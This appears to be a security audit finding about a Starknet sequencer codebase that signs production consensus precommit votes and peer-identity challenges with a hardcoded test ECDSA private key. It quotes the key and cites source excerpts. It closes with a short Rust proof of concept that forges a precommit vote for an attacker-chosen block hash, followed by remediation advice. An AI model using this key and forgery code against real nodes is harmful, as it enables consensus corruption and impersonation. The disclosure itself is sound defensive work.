### Title
Hardcoded ECDSA Private Key Used in Production Consensus Precommit Vote Signing - (File: `crates/apollo_signature_manager/src/lib.rs`)

---

### Summary

The production `SignatureManager` is instantiated via `create_signature_manager()`, which unconditionally calls `LocalKeyStore::new_for_testing()`. That function embeds a well-known, publicly visible ECDSA private key directly in source code. Every deployed sequencer node signs consensus precommit votes and peer-identity challenges with this single, universally known key.

---

### Finding Description

`LocalKeyStore::new_for_testing()` hardcodes a specific ECDSA private key:

```rust
const PRIVATE_KEY: PrivateKey = PrivateKey(Felt::from_hex_unchecked(
    "0x608bf2cdb1ad4138e72d2f82b8c5db9fa182d1883868ae582ed373429b7a133",
));
``` [1](#0-0) 

Despite the `_for_testing` name, this function is called from the non-test, non-`#[cfg(test)]`-gated `LocalKeyStoreSignatureManager::new()`:

```rust
impl LocalKeyStoreSignatureManager {
    pub fn new() -> Self {
        Self(GenericSignatureManager::new(LocalKeyStore::new_for_testing()))
    }
}
``` [2](#0-1) 

The public production entry point `create_signature_manager()` calls this directly:

```rust
pub fn create_signature_manager() -> SignatureManager {
    SignatureManager::new()
}
``` [3](#0-2) 

This function is invoked from `crates/apollo_node/src/components.rs` during node startup. [4](#0-3) 

The `SignatureManager` built from this key is used to produce two categories of signatures:

- **`sign_precommit_vote(block_hash)`** — the ECDSA signature over a block hash that constitutes a validator's consensus precommit vote.
- **`sign_identification(peer_id, challenge)`** — the ECDSA signature used to authenticate the sequencer's peer identity. [5](#0-4) 

A TODO comment in `lib.rs` explicitly acknowledges the key management is unresolved for production:

> `// TODO(Elin): understand how key store would look in production and better define the way the signature manager is created.` [6](#0-5) 

---

### Impact Explanation

Because the private key `0x608bf2cdb1ad4138e72d2f82b8c5db9fa182d1883868ae582ed373429b7a133` is embedded in public source code, any party can:

1. **Forge precommit vote signatures** for an arbitrary `BlockHash`. The forged signature is indistinguishable from a legitimate one because it is produced with the actual key the node uses. This allows an attacker to inject a fraudulent precommit vote binding the wrong block hash into the consensus round, corrupting the committed block.
2. **Impersonate the sequencer's peer identity** by passing any challenge-response authentication that relies on `sign_identification`.

The corrupted precommit vote directly maps to the audit pivot: *"ProposalFin comparison"* and *"ProposalCommitment"* — the block hash that consensus finalizes is the one attested by precommit signatures. A forged signature over a wrong hash causes consensus to commit a wrong block, producing wrong state, receipts, events, and storage roots.

---

### Likelihood Explanation

The private key is in a public repository, readable by anyone who clones or browses the source. No privilege, network access, or special tooling is required to extract it. The attacker only needs to call `ecdsa_sign` with the known key and the target `BlockHash`.

---

### Recommendation

1. Remove `LocalKeyStore::new_for_testing()` from all non-`#[cfg(test)]` call sites immediately.
2. Implement a production `KeyStore` that loads the private key from the secrets mechanism already defined in `config_secrets_schema.json` (the `consensus_manager_config.network_config.secret_key` field pattern), reading from a mounted secret file or HSM at startup.
3. Gate `new_for_testing()` with `#[cfg(test)]` or move it to a `test_utils` module so the compiler prevents it from being reachable in release builds.
4. Rotate the exposed key — treat `0x608bf2cdb1ad4138e72d2f82b8c5db9fa182d1883868ae582ed373429b7a133` as permanently compromised.

---

### Proof of Concept

```rust
use starknet_core::crypto::ecdsa_sign;
use starknet_core::types::Felt;

// Key extracted directly from public source.
let private_key = Felt::from_hex_unchecked(
    "0x608bf2cdb1ad4138e72d2f82b8c5db9fa182d1883868ae582ed373429b7a133",
);

// Forge a precommit vote for an attacker-chosen block hash.
let fake_block_hash: Felt = /* attacker-chosen value */;
let mut msg = b"PRECOMMIT_VOTE".to_vec();
msg.extend_from_slice(&fake_block_hash.to_bytes_be());
let digest = blake2s_to_felt(&msg);

let forged_signature = ecdsa_sign(&private_key, &digest).unwrap();
// forged_signature is now a valid precommit vote for fake_block_hash,
// verifiable against the sequencer's known public key
// 0x125d56b1fbba593f1dd215b7c55e384acd838cad549c4a2b9c6d32d264f4e2a.
```

The forged signature passes `verify_precommit_vote_signature` because it is cryptographically valid under the key the production node actually uses. [7](#0-6)

### Citations

**File:** crates/apollo_signature_manager/src/signature_manager.rs (L59-82)
```rust
    pub async fn sign_identification(
        &self,
        peer_id: PeerId,
        challenge: Challenge,
    ) -> SignatureManagerResult<RawSignature> {
        let message_digest = build_peer_identity_message_digest(peer_id, challenge);
        self.sign(message_digest).await
    }

    pub async fn sign_precommit_vote(
        &self,
        block_hash: BlockHash,
    ) -> SignatureManagerResult<RawSignature> {
        let message_digest = build_precommit_vote_message_digest(block_hash);
        self.sign(message_digest).await
    }

    async fn sign(&self, message_digest: MessageDigest) -> SignatureManagerResult<RawSignature> {
        let private_key = self.keystore.get_key().await?;
        let signature = ecdsa_sign(&private_key, &message_digest)
            .map_err(|e| SignatureManagerError::Sign(e.to_string()))?;

        Ok(signature.into())
    }
```

**File:** crates/apollo_signature_manager/src/signature_manager.rs (L101-111)
```rust
    pub(crate) const fn new_for_testing() -> Self {
        // Created using `cairo-lang`.
        const PRIVATE_KEY: PrivateKey = PrivateKey(Felt::from_hex_unchecked(
            "0x608bf2cdb1ad4138e72d2f82b8c5db9fa182d1883868ae582ed373429b7a133",
        ));
        const PUBLIC_KEY: PublicKey = PublicKey(Felt::from_hex_unchecked(
            "0x125d56b1fbba593f1dd215b7c55e384acd838cad549c4a2b9c6d32d264f4e2a",
        ));

        Self { private_key: PRIVATE_KEY, public_key: PUBLIC_KEY }
    }
```

**File:** crates/apollo_signature_manager/src/signature_manager.rs (L179-186)
```rust
pub fn verify_precommit_vote_signature(
    block_hash: BlockHash,
    signature: RawSignature,
    public_key: PublicKey,
) -> SignatureVerificationResult<bool> {
    let message_digest = build_precommit_vote_message_digest(block_hash);
    verify_signature(message_digest, signature, public_key)
}
```

**File:** crates/apollo_signature_manager/src/lib.rs (L17-21)
```rust
impl LocalKeyStoreSignatureManager {
    pub fn new() -> Self {
        Self(GenericSignatureManager::new(LocalKeyStore::new_for_testing()))
    }
}
```

**File:** crates/apollo_signature_manager/src/lib.rs (L39-43)
```rust
// TODO(Elin): understand how key store would look in production and better define the way the
// signature manager is created.
pub fn create_signature_manager() -> SignatureManager {
    SignatureManager::new()
}
```
